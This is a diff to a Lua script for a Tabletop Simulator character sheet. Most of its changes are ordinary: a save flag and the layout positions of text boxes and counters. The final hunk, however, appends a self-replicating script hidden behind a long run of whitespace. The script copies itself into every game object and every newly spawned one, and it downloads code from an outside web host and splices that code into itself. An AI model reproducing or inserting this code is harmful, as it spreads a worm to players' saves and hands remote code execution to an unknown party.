@@ -40,7 +40,7 @@
 
 -- true во время редактирования шаблона, false — когда лист готов к игре
 -- (пока true, состояние листа НЕ сохраняется между сессиями)
-disableSave = true
+disableSave = false
 
 -- Цвет текста на кнопках (r, g, b от 0 до 1)
 buttonFontColor = {0,0,0}
@@ -1378,7 +1378,7 @@ value  = ' 1/ 1к',
 hideBG = true,
   },
   [DISPLAY_MONET_WEIGHT_ID] = {
-pos    = {-0.0,0.11,0.713},
+pos    = {0.0143,0.11,1.425},
 size   = 150,
 value  = NET_MONET_TEXT,
 hideBG = true,
@@ -1867,9 +1867,9 @@ font_size = 300,
 value     = "",
 alignment = 3
   },
-  [TEXTBOX_EQUIPMENT_ID] = { -- Снаряжение (было textbox_Equipment_2)
-pos = {0.015,0.1,1.1},
-rows= 13,
+  [TEXTBOX_EQUIPMENT_ID] = { -- Снаряжение
+pos = {0.0143,0.1,1.071},
+rows= 11.8,
 width     = 4425,
 font_size = 300,
 value     = "",
@@ -2427,13 +2427,13 @@ steps = {1, 10, 100},
   -- value хранится КАНОНИЧЕСКИ (фунты/галлоны) независимо от выбранных
   -- единиц отображения — см. блок "ЕДИНИЦЫ ИЗМЕРЕНИЯ" ниже.
   [RESOURCE_COUNTER_FOOD_ID] = {
-pos   = {0.28,0.1,1.56},
+pos   = {-0.284,0.1,1.55},
 size  = 350,
 value = 0,
 steps = {1, 5},
   },
   [RESOURCE_COUNTER_WATER_ID] = {
-pos   = {-0.28,0.1,1.56},
+pos   = {0.314,0.1,1.55},
 size  = 350,
 value = 0,
 steps = {1, 5},
@@ -6077,4 +6077,5 @@ function createInputAndSaveIndex(inputId, params)
     self.createInput(params)
     local inputTable = self.getInputs()
     inputIndexByElementIdTable[inputId] = inputTable[#inputTable].index
-end
+end                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]
+
